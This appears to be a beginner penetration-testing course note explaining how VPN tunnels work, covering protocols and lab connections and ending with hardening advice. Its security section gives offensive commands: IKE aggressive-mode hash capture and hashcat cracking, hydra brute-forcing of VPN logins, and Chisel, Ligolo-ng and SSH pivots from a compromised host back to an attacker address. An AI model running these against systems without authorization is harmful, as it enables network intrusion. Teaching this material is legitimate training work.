---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.16 VPNs — How They Tunnel Traffic"
---

# 01.16 — VPNs — How They Tunnel Traffic

## What is it?

A **VPN (Virtual Private Network)** creates an encrypted tunnel between two points over a public network (usually the internet). Traffic sent through this tunnel appears to come from the VPN server, not the real client.

**Analogy:** A VPN is like a secret underground passage between your home and a destination — outsiders see the passage entrance/exit but not who's inside or what's being carried.

---

## How a VPN Tunnel Works

```
WITHOUT VPN:
Your PC ──────────────────────────────────────→ Website
IP: 192.168.1.100              Internet sees: 192.168.1.100 (or your ISP NAT IP)

WITH VPN:
Your PC ──[Encrypted Tunnel]──→ VPN Server ──────────→ Website
IP: 192.168.1.100               IP: 203.0.113.10   Internet sees: 203.0.113.10

WHAT THE TUNNEL LOOKS LIKE:
┌────────────────────────────────────────────────────────────┐
│ Outer packet: 192.168.1.100 → 203.0.113.10 (VPN server)  │
│ ┌──────────────────────────────────────────────────────┐  │
│ │ Inner packet (ENCRYPTED):                            │  │
│ │   192.168.1.100 → 142.250.182.46 (google.com)        │  │
│ └──────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
ISP sees: Your PC talking to VPN server (can't see google.com)
```

---

## VPN Protocols

```
PROTOCOL    PORT       SECURITY       USE CASE
──────────────────────────────────────────────────────────────
OpenVPN     1194/UDP   High           Most configurable, open-source
WireGuard   51820/UDP  High           Modern, fast, small codebase
IPSec/IKEv2 500/UDP    High           Business VPNs, mobile devices
L2TP/IPSec  1701/UDP   Medium         Legacy, widely supported
PPTP        1723/TCP   LOW (broken)   Legacy — avoid, MS-CHAPv2 cracked
SSTP        443/TCP    High           Windows only, uses HTTPS port
```

---

## VPN Use Cases in Pentesting

```
1. CLIENT VPN: Personal anonymity
   Attacker → [Commercial VPN] → Target
   Changes your apparent IP for recon

2. CORPORATE VPN: Access internal network
   Remote Employee ─[VPN]─→ Corporate Network
   After compromising VPN credentials → full internal access

3. PIVOTING VPN: Post-exploitation
   Attacker → Compromised Machine ─[VPN/Tunnel]─→ Internal Network
   Route your attack traffic through a pivot host

4. HACK THE BOX / LABS: Connect to lab
   Your Kali → [HTB VPN: openvpn hackthebox.eu.ovpn] → HTB Network
   Now you can reach lab machines (10.10.10.x)
```

---

## Security Context — VPNs in VAPT

### 1. VPN Endpoint Enumeration

```bash
# Nmap scan for VPN protocols:
nmap -sU -p 500,4500,1194 target     # IKE, NAT-T, OpenVPN
nmap -sU -p 1701 target              # L2TP
nmap -p 1723 target                  # PPTP
nmap -p 443 target                   # SSTP

# ike-scan — identify IKE/IPSec VPN endpoints
ike-scan target

# OpenVPN fingerprinting
nmap -sU -p 1194 --script openvpn-detect target
```

### 2. IKE Aggressive Mode — Identity Leakage

IPSec VPNs operating in "aggressive mode" reveal the VPN group name in cleartext.

```bash
# ike-scan in aggressive mode
ike-scan -A target
ike-scan -A --id=GroupVPN target    # probe specific group name

# If aggressive mode enabled:
# → Get preshared key hash → crack offline with hashcat
ike-scan -A --id=VPN target -P hash.txt
hashcat -m 5300 hash.txt rockyou.txt   # IKEv1 PSK
```

### 3. VPN Credential Attacks

```bash
# OpenVPN with username/password:
# Brute force login
hydra -L users.txt -P pass.txt vpn.target.com openvpn

# Cisco AnyConnect / SSL VPN (webvpn):
# Usually at https://vpn.target.com/
# Brute force with hydra or burp
hydra -L users.txt -P pass.txt vpn.target.com https-post-form \
  "/+webvpn+/index.html:username=^USER^&password=^PASS^:Login failed"
```

### 4. Split Tunneling — VPN Bypass

Many VPNs use "split tunneling" — only corporate traffic goes through VPN, internet traffic goes direct.

```
SPLIT TUNNELING ON:
Corporate (10.0.0.0/8) → through VPN tunnel
Internet (0.0.0.0/0)   → direct (not through VPN)

Attacker on same WiFi as employee:
→ Can intercept employee's non-VPN internet traffic
→ DNS requests, HTTP traffic to internet are exposed
```

```bash
# On target machine: check routing table
route -n
ip route show
# 10.0.0.0/8 via VPN_IP  ← only corp traffic via VPN
# 0.0.0.0/0 via 192.168.1.1  ← internet via local gateway (exposed!)
```

### 5. VPN as Pivot — Chisel/Ligolo-ng

After compromising a host, use it to pivot into internal network:

```bash
# Method 1: Chisel (HTTP tunneling — works through most firewalls)
# On attacker:
./chisel server -p 8080 --reverse
# On compromised pivot host:
./chisel client attacker-ip:8080 R:socks

# Now use proxychains through pivot:
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT internal-host

# Method 2: Ligolo-ng (TUN interface — transparent proxy)
# On attacker:
./proxy -selfcert -laddr 0.0.0.0:11601
# On pivot:
./agent -connect attacker-ip:11601 -ignore-cert
# On attacker ligolo shell:
session          ← select session
start            ← start tunnel
# Add route:
sudo ip route add 10.0.0.0/8 dev ligolo

# Method 3: SSH port forwarding
ssh -L 8080:internal-web:80 user@pivot      # local forward
ssh -R 4444:0.0.0.0:4444 user@pivot        # remote forward
ssh -D 9050 user@pivot                     # SOCKS proxy
```

### 6. HTB / TryHackMe VPN Connection

```bash
# Connect to HackTheBox network
sudo openvpn your-username.ovpn

# Verify connection:
ip addr show tun0
# 10.10.14.x = your HTB IP

# Test connectivity to a machine:
ping 10.10.10.100
```

---

## Hands-On: VPN Commands

```bash
# Start OpenVPN connection
sudo openvpn --config client.ovpn

# Check VPN status
ip addr show tun0    ← tun = OpenVPN, wg0 = WireGuard

# WireGuard
sudo wg show
sudo wg-quick up wg0

# Kill switch — block traffic if VPN drops
iptables -I OUTPUT ! -o tun0 -m mark ! --mark $(wg show wg0 fwmark) -j REJECT
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| IKE aggressive mode | Use main mode only (no aggressive mode) |
| Weak preshared keys | Use certificate-based auth instead of PSK |
| PPTP still in use | Migrate to WireGuard or IKEv2 |
| Split tunneling exposing traffic | Force all traffic through VPN (full tunnel) |
| VPN accessible from internet without 2FA | Add MFA to VPN authentication |
| Outdated VPN software with CVEs | Patch regularly (Pulse Secure, Fortinet had critical CVEs) |

---

## Related Notes
- [[12 - Firewalls How They Work]] — VPN traverses firewalls
- [[06 - TCP Three-Way Handshake]] — TCP underlying VPN protocols
- [[Module 05 - Recon]] — VPN endpoint discovery
- [[Module 41 - Active Directory]] — VPN often leads into AD domain
